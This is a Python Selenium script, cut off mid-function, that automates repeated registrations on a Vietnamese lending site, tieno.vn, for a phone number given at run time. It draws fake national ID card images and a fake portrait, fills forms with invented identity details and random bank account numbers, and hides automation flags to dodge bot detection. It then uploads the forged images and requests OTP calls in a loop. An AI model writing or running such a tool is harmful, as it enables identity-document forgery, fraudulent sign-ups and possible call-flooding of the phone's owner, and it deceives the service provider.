# -*- coding: utf-8 -*-
import os
import sys
import time
import random
import subprocess
import threading
import importlib
import asyncio
import io

# Fix Windows console UTF-8
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')


# ============================================================
# FILE 1
# ============================================================
import os
import sys
import subprocess
import time
import random
import re

def install_packages():
    packages = ['pillow', 'selenium', 'fake-useragent']
    
    print("📦 Đang kiểm tra và cài đặt các thư viện cần thiết...")
    print("-" * 50)
    
    for package in packages:
        try:
            if package == 'fake-useragent':
                __import__('fake_useragent')
            else:
                __import__(package)
            print(f"   ✅ {package} đã được cài đặt")
        except ImportError:
            print(f"   ⏳ Đang cài đặt {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
            print(f"   ✅ Đã cài đặt {package}")
    
    print("-" * 50)
    print("✅ Tất cả thư viện đã sẵn sàng!\n")

install_packages()

from PIL import Image, ImageDraw, ImageFont
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.edge.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from fake_useragent import UserAgent

ua = UserAgent()

HO_TEN = "Nguyễn Văn A"
EMAIL = "huutinh1976743"
NGAY_SINH = "30.04.1999"
SO_CCCD = "049204123456"
SO_DT_NGUOI_THAN = "0948487344"
SO_DT_TUYEN_DUNG = "0912345678"

def tao_anh_cccd_mat_truoc(so_cccd, ho_ten, ngay_sinh):
    print("   📸 Đang tạo ảnh mặt trước CCCD...")
    
    width, height = 800, 500
    img = Image.new('RGB', (width, height), color=(240, 235, 220))
    draw = ImageDraw.Draw(img)
    
    try:
        font = ImageFont.truetype("arial.ttf", 20)
        font_large = ImageFont.truetype("arial.ttf", 30)
        font_small = ImageFont.truetype("arial.ttf", 16)
    except:
        try:
            font = ImageFont.truetype("Arial.ttf", 20)
            font_large = ImageFont.truetype("Arial.ttf", 30)
            font_small = ImageFont.truetype("Arial.ttf", 16)
        except:
            try:
                font = ImageFont.truetype("C:/Windows/Fonts/arial.ttf", 20)
                font_large = ImageFont.truetype("C:/Windows/Fonts/arial.ttf", 30)
                font_small = ImageFont.truetype("C:/Windows/Fonts/arial.ttf", 16)
            except:
                font = ImageFont.load_default()
                font_large = ImageFont.load_default()
                font_small = ImageFont.load_default()
    
    draw.rectangle([10, 10, width-10, height-10], outline=(50, 50, 50), width=3)
    
    draw.text((width//2 - 100, 20), "CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM", fill=(0, 0, 0), font=font_large)
    draw.text((width//2 - 80, 55), "Độc lập - Tự do - Hạnh phúc", fill=(0, 0, 0), font=font)
    draw.text((width//2 - 40, 85), "CĂN CƯỚC CÔNG DÂN", fill=(0, 0, 255), font=font_large)
    
    draw.rectangle([30, 120, 180, 300], outline=(100, 100, 100), width=2)
    draw.rectangle([50, 140, 160, 280], fill=(200, 200, 200))
    draw.text((65, 200), "ẢNH", fill=(150, 150, 150), font=font_large)
    
    y_start = 130
    draw.text((200, y_start), f"Họ và tên: {ho_ten}", fill=(0, 0, 0), font=font)
    draw.text((200, y_start + 30), f"Ngày sinh: {ngay_sinh}", fill=(0, 0, 0), font=font)
    draw.text((200, y_start + 60), "Giới tính: Nam", fill=(0, 0, 0), font=font)
    draw.text((200, y_start + 90), f"Số CCCD: {so_cccd}", fill=(0, 0, 0), font=font)
    draw.text((200, y_start + 120), "Nơi thường trú: Tp. Hồ Chí Minh", fill=(0, 0, 0), font=font_small)
    draw.text((200, y_start + 145), "Ngày cấp: 01.01.2020", fill=(0, 0, 0), font=font_small)
    draw.text((200, y_start + 170), "Nơi cấp: Cục Cảnh sát QLHC", fill=(0, 0, 0), font=font_small)
    draw.text((200, y_start + 195), "Có giá trị đến: 01.01.2030", fill=(0, 0, 0), font=font_small)
    
    draw.rectangle([width-200, height-100, width-30, height-30], outline=(0, 0, 0), width=2)
    for x in range(width-190, width-40, 15):
        for y in range(height-90, height-40, 15):
            if random.random() > 0.6:
                draw.rectangle([x, y, x+10, y+10], fill=(0, 0, 0))
    
    path = os.path.join(os.path.dirname(__file__), "mat_truoc_cccd.jpg")
    img.save(path, quality=95)
    print(f"   ✅ Đã tạo: {path}")
    return path

def tao_anh_cccd_mat_sau(so_cccd):
    print("   📸 Đang tạo ảnh mặt sau CCCD...")
    
    width, height = 800, 500
    img = Image.new('RGB', (width, height), color=(240, 235, 220))
    draw = ImageDraw.Draw(img)
    
    try:
        font = ImageFont.truetype("arial.ttf", 20)
        font_small = ImageFont.truetype("arial.ttf", 16)
    except:
        try:
            font = ImageFont.truetype("Arial.ttf", 20)
            font_small = ImageFont.truetype("Arial.ttf", 16)
        except:
            try:
                font = ImageFont.truetype("C:/Windows/Fonts/arial.ttf", 20)
                font_small = ImageFont.truetype("C:/Windows/Fonts/arial.ttf", 16)
            except:
                font = ImageFont.load_default()
                font_small = ImageFont.load_default()
    
    draw.rectangle([10, 10, width-10, height-10], outline=(50, 50, 50), width=3)
    
    draw.text((width//2 - 80, 20), "MẶT SAU CĂN CƯỚC CÔNG DÂN", fill=(0, 0, 255), font=font)
    
    draw.ellipse([width//2 - 60, 100, width//2 + 60, 220], outline=(100, 100, 100), width=2)
    for i in range(30):
        x = width//2 + random.randint(-50, 50)
        y = 100 + random.randint(0, 120)
        draw.arc([x-20, y-20, x+20, y+20], 0, 360, fill=(100, 100, 100), width=1)
    draw.text((width//2 - 25, 150), "VÂN TAY", fill=(100, 100, 100), font=font_small)
    
    bar_y = height - 60
    bar_height_max = 80
    
    for i in range(30, width-30, 4):
        bar_height = random.randint(20, bar_height_max)
        bar_top = bar_y - bar_height
        if bar_top < 0:
            bar_top = 0
            bar_height = bar_y
        draw.rectangle([i, bar_top, i + 2, bar_y], fill=(0, 0, 0))
    
    draw.rectangle([width-150, 30, width-30, 150], outline=(0, 0, 0), width=2)
    for x in range(width-140, width-40, 12):
        for y in range(40, 140, 12):
            if random.random() > 0.5:
                draw.rectangle([x, y, x+8, y+8], fill=(0, 0, 0))
    
    y_start = 250
    draw.text((30, y_start), "Đặc điểm nhận dạng: Không", fill=(0, 0, 0), font=font_small)
    draw.text((30, y_start + 30), "Nơi đăng ký thường trú: Tp. Hồ Chí Minh", fill=(0, 0, 0), font=font_small)
    draw.text((30, y_start + 60), f"Số CCCD: {so_cccd}", fill=(0, 0, 0), font=font_small)
    draw.text((30, y_start + 90), "Ngày cấp: 01.01.2020", fill=(0, 0, 0), font=font_small)
    draw.text((30, y_start + 120), "Nơi cấp: Cục Cảnh sát QLHC", fill=(0, 0, 0), font=font_small)
    
    path = os.path.join(os.path.dirname(__file__), "mat_sau_cccd.jpg")
    img.save(path, quality=95)
    print(f"   ✅ Đã tạo: {path}")
    return path

def tao_anh_chan_dung(ho_ten):
    print("   📸 Đang tạo ảnh chân dung...")
    
    width, height = 800, 600
    img = Image.new('RGB', (width, height), color=(240, 235, 220))
    draw = ImageDraw.Draw(img)
    
    try:
        font = ImageFont.truetype("arial.ttf", 20)
        font_small = ImageFont.truetype("arial.ttf", 14)
    except:
        try:
            font = ImageFont.truetype("Arial.ttf", 20)
            font_small = ImageFont.truetype("Arial.ttf", 14)
        except:
            try:
                font = ImageFont.truetype("C:/Windows/Fonts/arial.ttf", 20)
                font_small = ImageFont.truetype("C:/Windows/Fonts/arial.ttf", 14)
            except:
                font = ImageFont.load_default()
                font_small = ImageFont.load_default()
    
    draw.rectangle([50, 50, width-50, height-50], outline=(100, 100, 100), width=2)
    
    draw.rectangle([60, 60, width-60, height-60], fill=(220, 230, 240))
    
    head_x, head_y = width//2, 180
    draw.ellipse([head_x-60, head_y-70, head_x+60, head_y+50], fill=(255, 200, 180), outline=(100, 100, 100), width=2)
    
    draw.ellipse([head_x-30, head_y-30, head_x-15, head_y-15], fill=(0, 0, 0))
    draw.ellipse([head_x+15, head_y-30, head_x+30, head_y-15], fill=(0, 0, 0))
    draw.ellipse([head_x-28, head_y-28, head_x-17, head_y-17], fill=(255, 255, 255))
    draw.ellipse([head_x+17, head_y-28, head_x+28, head_y-17], fill=(255, 255, 255))
    
    draw.line([head_x-35, head_y-35, head_x-15, head_y-38], fill=(50, 50, 50), width=3)
    draw.line([head_x+15, head_y-38, head_x+35, head_y-35], fill=(50, 50, 50), width=3)
    
    draw.polygon([head_x-5, head_y-5, head_x+5, head_y-5, head_x, head_y+15], fill=(220, 180, 160))
    
    draw.arc([head_x-20, head_y+5, head_x+20, head_y+35], 0, 180, fill=(200, 50, 50), width=2)
    
    colors = [(50, 50, 50), (60, 60, 60), (40, 40, 40)]
    for i in range(-55, 56, 8):
        color = random.choice(colors)
        draw.arc([head_x+i-10, head_y-80, head_x+i+10, head_y-60], 0, 180, fill=color, width=4)
    for i in range(-60, 61, 12):
        if i < -30 or i > 30:
            draw.arc([head_x+i-8, head_y-75, head_x+i+8, head_y-55], 0, 180, fill=(50, 50, 50), width=3)
    
    draw.ellipse([head_x-65, head_y-20, head_x-55, head_y+10], fill=(255, 200, 180), outline=(100, 100, 100), width=2)
    draw.ellipse([head_x+55, head_y-20, head_x+65, head_y+10], fill=(255, 200, 180), outline=(100, 100, 100), width=2)
    
    body_x1, body_y1 = head_x-50, head_y+50
    body_x2, body_y2 = head_x+50, head_y+250
    draw.rectangle([body_x1, body_y1, body_x2, body_y2], fill=(50, 100, 200), outline=(100, 100, 100), width=2)
    
    draw.rectangle([head_x-20, head_y+40, head_x+20, head_y+60], fill=(255, 200, 180), outline=(100, 100, 100), width=2)
    
    draw.polygon([head_x-35, head_y+50, head_x+35, head_y+50, head_x+45, head_y+80, head_x-45, head_y+80], fill=(255, 255, 255), outline=(100, 100, 100), width=2)
    
    draw.polygon([head_x-10, head_y+70, head_x+10, head_y+70, head_x+5, head_y+110, head_x-5, head_y+110], fill=(200, 50, 50))
    
    draw.rectangle([body_x1-20, body_y1+10, body_x1, body_y1+60], fill=(50, 100, 200), outline=(100, 100, 100), width=2)
    draw.rectangle([body_x2, body_y1+10, body_x2+20, body_y1+60], fill=(50, 100, 200), outline=(100, 100, 100), width=2)
    
    draw.ellipse([body_x1-25, body_y1+55, body_x1-5, body_y1+75], fill=(255, 200, 180), outline=(100, 100, 100), width=2)
    draw.ellipse([body_x2+5, body_y1+55, body_x2+25, body_y1+75], fill=(255, 200, 180), outline=(100, 100, 100), width=2)
    
    draw.text((width//2 - 60, height-70), f"{ho_ten}", fill=(0, 0, 0), font=font)
    draw.text((width//2 - 80, height-40), "Người dùng CCCD", fill=(0, 0, 0), font=font_small)
    
    path = os.path.join(os.path.dirname(__file__), "chan_dung.jpg")
    img.save(path, quality=95)
    print(f"   ✅ Đã tạo: {path}")
    return path

def tao_tat_ca_anh():
    print("\n" + "="*50)
    print("📸 TẠO ẢNH TỰ ĐỘNG")
    print("="*50)
    
    path1 = tao_anh_cccd_mat_truoc(SO_CCCD, HO_TEN, NGAY_SINH)
    path2 = tao_anh_cccd_mat_sau(SO_CCCD)
    path3 = tao_anh_chan_dung(HO_TEN)
    
    print("\n" + "="*50)
    print("✅ Đã tạo xong 3 ảnh:")
    print(f"   1. {path1}")
    print(f"   2. {path2}")
    print(f"   3. {path3}")
    print("="*50 + "\n")
    
    return path1, path2, path3

def click_tiep_tuc(driver, wait):
    print("\n🔘 ĐANG TÌM NÚT TIẾP TỤC...")
    
    try:
        next_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Tiếp tục')]")))
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", next_btn)
        time.sleep(0.5)
        driver.execute_script("arguments[0].click();", next_btn)
        print("✅ Đã click nút Tiếp tục")
        return True
    except:
        pass
    
    try:
        next_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[@type='submit' and contains(text(), 'Tiếp')]")))
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", next_btn)
        time.sleep(0.5)
        driver.execute_script("arguments[0].click();", next_btn)
        print("✅ Đã click nút Tiếp tục (type=submit)")
        return True
    except:
        pass
    
    try:
        buttons = driver.find_elements(By.TAG_NAME, "button")
        for btn in buttons:
            if "tiếp" in btn.text.lower() or "tiep" in btn.text.lower():
                driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
                time.sleep(0.5)
                driver.execute_script("arguments[0].click();", btn)
                print(f"✅ Đã click nút: {btn.text}")
                return True
    except:
        pass
    
    print("❌ Không tìm thấy nút Tiếp tục")
    return False

def cho_trang_upload_xong(driver, wait, timeout=30):
    print("\n⏳ ĐỢI TRANG UPLOAD ẢNH LOAD XONG...")
    
    for i in range(timeout):
        try:
            file_inputs = driver.find_elements(By.XPATH, "//input[@type='file']")
            if len(file_inputs) >= 1:
                print(f"   ✅ Đã tìm thấy {len(file_inputs)} input file sau {i+1}s")
                time.sleep(2)
                return True
            
            upload_texts = driver.find_elements(By.XPATH, "//*[contains(text(), 'Tải ảnh lên')] | //*[contains(text(), 'Upload')] | //*[contains(text(), 'Chọn ảnh')]")
            if upload_texts:
                print(f"   ✅ Đã tìm thấy text upload sau {i+1}s")
                time.sleep(2)
                return True
            
            current_url = driver.current_url
            print(f"   🔄 Đợi load trang... ({i+1}/{timeout}) - URL: {current_url[:50]}...")
            time.sleep(1)
            
        except:
            time.sleep(1)
    
    print("   ⚠️ Hết thời gian chờ, vẫn tiếp tục...")
    return False

def main_1():
    print("="*60)
    print("TIENO.VN - DANG KY")
    print("="*60)
    
    if len(sys.argv) >= 2:
        SO_DIEN_THOAI = sys.argv[1]
        print(f"Phone: {SO_DIEN_THOAI}")
    else:
        SO_DIEN_THOAI = input("Phone number (10 digits, start with 0): ")
    
    so_dien_thoai_9so = SO_DIEN_THOAI[1:] if SO_DIEN_THOAI.startswith('0') else SO_DIEN_THOAI
    
    if len(sys.argv) >= 3:
        SO_LAN_LAP = int(sys.argv[2])
    else:
        SO_LAN_LAP = int(input("Number of registrations: "))
    
    path_mat_truoc, path_mat_sau, path_chan_dung = tao_tat_ca_anh()
    
    options = Options()
    options.add_argument("--start-maximized")
    options.add_argument("--disable-notifications")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    
    thanh_cong = 0
    that_bai = 0
    
    for lan in range(1, SO_LAN_LAP + 1):
        print(f"\n{'='*40}")
        print(f"LOOP {lan}/{SO_LAN_LAP}")
        print(f"{'='*40}")
        
        driver = webdriver.Edge(options=options)
        wait = WebDriverWait(driver, 15)
        
        try:
            driver.get("https://tieno.vn/")
            time.sleep(5)
            
            inputs = driver.find_elements(By.XPATH, "//input[@type='text' or @type='tel' or @type='email']")
            if len(inputs) > 0:
                inputs[0].send_keys(HO_TEN)
                print("DONE Full name")
            if len(inputs) > 1:
                inputs[1].send_keys(so_dien_thoai_9so)
                print("DONE Phone")
            if len(inputs) > 2:
                inputs[2].send_keys(EMAIL)
                print("DONE Email")
            
            for btn in driver.find_elements(By.TAG_NAME, "button"):
                if "ĐĂNG KÝ NGAY" in btn.text:
                    btn.click()
                    print("DONE Clicked DANG KY")
                    break
            time.sleep(5)
            
            driver.execute_script("window.scrollTo(0, 0);")
            time.sleep(2)
            
            try:
                driver.find_element(By.XPATH, "//*[text()='Nam']").click()
                print("DONE Gender Male")
            except:
                print("Gender selection not found")
            time.sleep(0.5)
            
            try:
                ngay_sinh = driver.find_element(By.XPATH, "//label[contains(text(), 'Ngày tháng năm sinh')]/following-sibling::input | //div[contains(text(), 'Ngày tháng năm sinh')]/following::input[1]")
                driver.execute_script("arguments[0].scrollIntoView(true);", ngay_sinh)
                time.sleep(0.5)
                driver.execute_script("arguments[0].value = '';", ngay_sinh)
                ngay_sinh.send_keys(NGAY_SINH)
                print(f"DONE Birthday: {NGAY_SINH}")
            except Exception as e:
                print(f"Birthday error: {e}")
            time.sleep(0.5)
            
            print("\n--- STEP: FILL CCCD ---")
            try:
                cccd_input = None
                xpath_patterns = [
                    "//label[contains(text(), 'Số CCCD')]/following-sibling::input",
                    "//label[contains(text(), 'Căn cước')]/following-sibling::input",
                    "//label[contains(text(), 'CCCD')]/following-sibling::input",
                    "//div[contains(text(), 'Số CCCD')]/following::input[1]",
                    "//div[contains(text(), 'Căn cước')]/following::input[1]",
                    "//input[@placeholder='Số CCCD']",
                    "//input[@placeholder='Nhập số CCCD']",
                    "//input[@name='cccd']",
                    "//input[@name='identity_number']",
                    "//input[@id='cccd']"
                ]
                for xpath in xpath_patterns:
                    try:
                        cccd_input = driver.find_element(By.XPATH, xpath)
                        if cccd_input and cccd_input.is_displayed():
                            print(f"Found CCCD input with: {xpath}")
                            break
                    except:
                        continue
                if not cccd_input:
                    all_inputs = driver.find_elements(By.XPATH, "//input[@type='text' or @type='number']")
                    for inp in all_inputs:
                        try:
                            prev_label = inp.find_element(By.XPATH, "./preceding-sibling::label[1]")
                            if prev_label and ("CCCD" in prev_label.text or "Căn cước" in prev_label.text):
                                cccd_input = inp
                                print("Found CCCD via preceding label")
                                break
                        except:
                            parent = inp.find_element(By.XPATH, "./..")
                            if parent and ("CCCD" in parent.text or "Căn cước" in parent.text):
                                cccd_input = inp
                                print("Found CCCD via parent text")
                                break
                if cccd_input:
                    driver.execute_script("arguments[0].scrollIntoView(true);", cccd_input)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].value = '';", cccd_input)
                    driver.execute_script("arguments[0].focus();", cccd_input)
                    cccd_input.send_keys(SO_CCCD)
                    print(f"DONE CCCD: {SO_CCCD}")
                else:
                    print("WARNING: CCCD input not found!")
            except Exception as e:
                print(f"CCCD error: {e}")
            time.sleep(0.5)
            
            driver.execute_script("window.scrollTo(0, 400);")
            time.sleep(1)
            
            try:
                selects = driver.find_elements(By.TAG_NAME, "select")
                for select in selects:
                    opts = [o.text for o in select.find_elements(By.TAG_NAME, "option")]
                    if "Iphone" in opts:
                        Select(select).select_by_visible_text("Iphone")
                        print("DONE Phone brand Iphone")
                        break
            except:
                print("Phone brand selection not found")
            time.sleep(0.5)
            
            print("\n--- STEP: CLICK ARROW ON 'Vị trí của bạn' ---")
            try:
                driver.execute_script("""
                    var labels = document.querySelectorAll('label, div, span, p');
                    var targetLabel = null;
                    for(var i=0; i<labels.length; i++){
                        if(labels[i].innerText && labels[i].innerText.includes('Vị trí của bạn')){
                            targetLabel = labels[i];
                            break;
                        }
                    }
                    if(targetLabel){
                        var parent = targetLabel.parentElement;
                        var arrow = parent.querySelector('.select2-selection__arrow, .dropdown-icon, [class*="arrow"]');
                        if(!arrow){
                            arrow = parent.querySelector('span[role="presentation"], .select2-arrow');
                        }
                        if(arrow){
                            arrow.click();
                            return 'Clicked arrow on location';
                        } else {
                            var select = parent.querySelector('select');
                            if(select){
                                var event = new MouseEvent('mousedown', {bubbles: true, view: window});
                                select.dispatchEvent(event);
                                return 'Clicked select element';
                            }
                        }
                    }
                    return 'Location label not found';
                """)
                print("DONE Clicked arrow on 'Vị trí của bạn'")
                time.sleep(1.5)
            except Exception as e:
                print(f"Location arrow click error: {e}")
            
            print("\n--- STEP: SELECT 'Điền địa chỉ bằng thủ công' ---")
            try:
                driver.execute_script("""
                    var options = document.querySelectorAll('li, div[role="option"], .select2-results__option');
                    for(var i=0; i<options.length; i++){
                        var text = options[i].innerText || options[i].textContent || '';
                        if(text.toLowerCase().includes('thủ công') || text.toLowerCase().includes('thu cong')){
                            options[i].click();
                            return 'Clicked manual address option';
                        }
                    }
                    var allOpts = document.querySelectorAll('option');
                    for(var i=0; i<allOpts.length; i++){
                        if(allOpts[i].text.toLowerCase().includes('thủ công')){
                            allOpts[i].selected = true;
                            allOpts[i].dispatchEvent(new Event('change', {bubbles: true}));
                            return 'Selected manual via option';
                        }
                    }
                    return 'Manual option not found';
                """)
                print("DONE Selected 'Điền địa chỉ bằng thủ công'")
                time.sleep(2)
            except Exception as e:
                print(f"Manual selection error: {e}")
            
            print("\n--- STEP: CLICK ARROW ON 'Tỉnh/Thành' ---")
            try:
                driver.execute_script("""
                    var labels = document.querySelectorAll('label, div, span, p');
                    var targetLabel = null;
                    for(var i=0; i<labels.length; i++){
                        if(labels[i].innerText && (labels[i].innerText.includes('Tỉnh/Thành') || labels[i].innerText.includes('Tỉnh Thành'))){
                            targetLabel = labels[i];
                            break;
                        }
                    }
                    if(targetLabel){
                        var parent = targetLabel.parentElement;
                        var arrow = parent.querySelector('.select2-selection__arrow, .dropdown-icon, [class*="arrow"]');
                        if(!arrow){
                            arrow = parent.querySelector('span[role="presentation"], .select2-arrow');
                        }
                        if(arrow){
                            arrow.click();
                            return 'Clicked arrow on province';
                        } else {
                            var select = parent.querySelector('select');
                            if(select){
                                var event = new MouseEvent('mousedown', {bubbles: true, view: window});
                                select.dispatchEvent(event);
                                return 'Clicked select element';
                            }
                        }
                    }
                    return 'Province label not found';
                """)
                print("DONE Clicked arrow on 'Tỉnh/Thành'")
                time.sleep(1.5)
            except Exception as e:
                print(f"Province arrow click error: {e}")
            
            print("\n--- STEP: SELECT PROVINCE ---")
            try:
                province_selected = driver.execute_script("""
                    var targetProvince = 'An Giang';
                    var items = document.querySelectorAll('li, div[role="option"], .select2-results__option, span');
                    for(var i=0; i<items.length; i++){
                        var text = items[i].innerText || items[i].textContent || '';
                        if(text.trim() === targetProvince || text.includes(targetProvince)){
                            items[i].click();
                            return 'Selected: ' + targetProvince;
                        }
                    }
                    var selects = document.querySelectorAll('select');
                    for(var i=0; i<selects.length; i++){
                        var opts = selects[i].querySelectorAll('option');
                        for(var j=1; j<opts.length; j++){
                            if(opts[j].text.includes(targetProvince)){
                                selects[i].value = opts[j].value;
                                selects[i].dispatchEvent(new Event('change', {bubbles: true}));
                                return 'Selected via select: ' + opts[j].text;
                            }
                        }
                    }
                    return 'Province not found';
                """)
                print(f"DONE {province_selected}")
                time.sleep(1.5)
            except Exception as e:
                print(f"Province selection error: {e}")
            
            try:
                sdt_nguoi_than = driver.find_element(By.XPATH, "//label[contains(text(), 'Số điện thoại người thân')]/following-sibling::input | //div[contains(text(), 'Số điện thoại người thân')]/following::input[1]")
                driver.execute_script("arguments[0].scrollIntoView(true);", sdt_nguoi_than)
                time.sleep(0.5)
                driver.execute_script("arguments[0].value = '';", sdt_nguoi_than)
                sdt_nguoi_than.send_keys(SO_DT_NGUOI_THAN)
                print(f"DONE Relative phone: {SO_DT_NGUOI_THAN}")
            except:
                tels = driver.find_elements(By.XPATH, "//input[@type='tel']")
                if len(tels) >= 1:
                    driver.execute_script("arguments[0].scrollIntoView(true);", tels[0])
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].value = '';", tels[0])
                    tels[0].send_keys(SO_DT_NGUOI_THAN)
                    print(f"DONE Relative phone: {SO_DT_NGUOI_THAN}")
            time.sleep(0.5)
            
            try:
                sdt_tuyen_dung = driver.find_element(By.XPATH, "//label[contains(text(), 'Số điện thoại nhà tuyển dụng')]/following-sibling::input | //label[contains(text(), 'đồng nghiệp')]/following-sibling::input")
                driver.execute_script("arguments[0].scrollIntoView(true);", sdt_tuyen_dung)
                time.sleep(0.5)
                driver.execute_script("arguments[0].value = '';", sdt_tuyen_dung)
                sdt_tuyen_dung.send_keys(SO_DT_TUYEN_DUNG)
                print(f"DONE Employer phone: {SO_DT_TUYEN_DUNG}")
            except:
                tels = driver.find_elements(By.XPATH, "//input[@type='tel']")
                if len(tels) >= 2:
                    driver.execute_script("arguments[0].scrollIntoView(true);", tels[1])
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].value = '';", tels[1])
                    tels[1].send_keys(SO_DT_TUYEN_DUNG)
                    print(f"DONE Employer phone: {SO_DT_TUYEN_DUNG}")
            time.sleep(0.5)
            
            try:
                selects = driver.find_elements(By.TAG_NAME, "select")
                for select in selects:
                    opts = [o.text for o in select.find_elements(By.TAG_NAME, "option")]
                    if "Vietcombank" in str(opts):
                        for opt in select.find_elements(By.TAG_NAME, "option"):
                            if "Vietcombank" in opt.text:
                                opt.click()
                                print("DONE Bank: Vietcombank")
                                break
                        break
            except Exception as e:
                print(f"Bank selection error: {e}")
            time.sleep(0.5)
            
            print("\n💰 NHẬP SỐ TÀI KHOẢN RANDOM (8/9/10 SỐ)")
            
            so_tk_input = None
            try:
                so_tk_input = driver.find_element(By.XPATH, "//input[@placeholder='Số tài khoản']")
                print("   ✅ Tìm thấy input bằng placeholder")
            except:
                pass
            
            if not so_tk_input:
                try:
                    so_tk_input = driver.find_element(By.XPATH, "//*[contains(text(), 'Số tài khoản')]/following::input[1]")
                    print("   ✅ Tìm thấy input bằng label")
                except:
                    pass
            
            if not so_tk_input:
                all_inputs = driver.find_elements(By.TAG_NAME, "input")
                for inp in all_inputs:
                    try:
                        input_type = inp.get_attribute("type")
                        if input_type == "text" and inp.is_displayed() and inp.is_enabled():
                            so_tk_input = inp
                            print("   ✅ Tìm thấy input text cuối cùng")
                            break
                    except:
                        pass
            
            if so_tk_input:
                driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", so_tk_input)
                time.sleep(0.5)
                
                for i in range(1, 11):
                    do_dai = random.choice([8, 9, 10])
                    so_tai_khoan_random = ''.join([str(random.randint(0, 9)) for _ in range(do_dai)])
                    print(f"   Lần {i}: {so_tai_khoan_random} ({do_dai} số)")
                    driver.execute_script("arguments[0].value = arguments[1];", so_tk_input, so_tai_khoan_random)
                    time.sleep(0.3)
                    driver.execute_script("arguments[0].dispatchEvent(new Event('change', {bubbles: true}));", so_tk_input)
                    time.sleep(0.2)
                
                so_cuoi = so_tk_input.get_attribute("value")
                print(f"\n✅ Đã nhập 10 số tài khoản random")
                print(f"📌 Số tài khoản cuối cùng: {so_cuoi}")
            else:
                print("   ❌ KHÔNG TÌM THẤY INPUT SỐ TÀI KHOẢN!")
            
            driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
            time.sleep(1)
            
            click_tiep_tuc(driver, wait)
            
            cho_trang_upload_xong(driver, wait, timeout=30)
            
            print("\n📸 STEP: UPLOAD 3 IMAGES (TỪNG CÁI MỘT)")
            
            ten_anh = ["Mặt trước CCCD", "Mặt sau CCCD", "Ảnh chân dung với CCCD"]
            paths = [path_mat_truoc, path_mat_sau, path_chan_dung]
            
            for i in range(3):
                try:
                    print(f"\n   🔹 Đang upload {ten_anh[i]}...")
                    tim_thay_file_input = None
                    
                    file_inputs = driver.find_elements(By.XPATH, "//input[@type='file']")
                    if len(file_inputs) > i:
                        tim_thay_file_input = file_inputs[i]
                        print(f"      Tìm thấy file input thứ {i+1}")
                    
                    if not tim_thay_file_input:
                        hidden_inputs = driver.find_elements(By.CSS_SELECTOR, "input[type='file'][style*='display:none'], input[type='file'][style*='visibility:hidden']")
                        if hidden_inputs and len(hidden_inputs) > i:
                            tim_thay_file_input = hidden_inputs[i]
                            print(f"      Tìm thấy file input ẩn thứ {i+1}")
                            driver.execute_script("arguments[0].style.display = 'block';", tim_thay_file_input)
                    
                    if not tim_thay_file_input:
                        labels = driver.find_elements(By.XPATH, f"//label[contains(text(), '{ten_anh[i]}')]")
                        for label in labels:
                            try:
                                input_id = label.get_attribute("for")
                                if input_id:
                                    file_input = driver.find_element(By.ID, input_id)
                                    if file_input.get_attribute("type") == "file":
                                        tim_thay_file_input = file_input
                                        print(f"      Tìm thấy file input qua label ID: {input_id}")
                                        break
                            except:
                                pass
                    
                    if not tim_thay_file_input:
                        upload_btns = driver.find_elements(By.XPATH, f"//button[contains(text(), 'Tải lên')] | //button[contains(text(), 'Upload')] | //div[contains(text(), 'Tải ảnh lên')]")
                        for btn in upload_btns:
                            try:
                                parent = btn.find_element(By.XPATH, "./..")
                                file_input = parent.find_element(By.XPATH, ".//input[@type='file']")
                                if file_input:
                                    tim_thay_file_input = file_input
                                    print(f"      Tìm thấy file input gần button upload")
                                    break
                            except:
                                pass
                    
                    if tim_thay_file_input:
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", tim_thay_file_input)
                        time.sleep(0.5)
                        
                        driver.execute_script("arguments[0].style.display = 'block';", tim_thay_file_input)
                        driver.execute_script("arguments[0].style.visibility = 'visible';", tim_thay_file_input)
                        driver.execute_script("arguments[0].style.opacity = '1';", tim_thay_file_input)
                        
                        tim_thay_file_input.send_keys(paths[i])
                        print(f"      ✅ Đã upload {ten_anh[i]} xong")
                        time.sleep(3)
                    else:
                        print(f"      ❌ Không tìm thấy input file cho {ten_anh[i]}")
                        print(f"      🔄 Thử tìm tất cả input file trong trang...")
                        all_file_inputs = driver.find_elements(By.XPATH, "//input[@type='file']")
                        print(f"      📝 Tổng số input file trong trang: {len(all_file_inputs)}")
                        
                except Exception as e:
                    print(f"      ❌ Lỗi upload {ten_anh[i]}: {e}")
            
            print("\n📞 STEP: CLICK 'Nhận mã OTP qua cuộc gọi'")
            try:
                driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
                time.sleep(2)
                
                otp_button = None
                
                try:
                    otp_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Nhận mã OTP qua cuộc gọi')]")))
                except:
                    pass
                
                if not otp_button:
                    try:
                        otp_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Nhận OTP')]")))
                    except:
                        pass
                
                if not otp_button:
                    all_buttons = driver.find_elements(By.TAG_NAME, "button")
                    for btn in all_buttons:
                        if "OTP" in btn.text or "otp" in btn.text:
                            otp_button = btn
                            break
                
                if not otp_button:
                    driver.execute_script("window.scrollTo(0, 0);")
                    time.sleep(1)
                    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
                    time.sleep(2)
                    
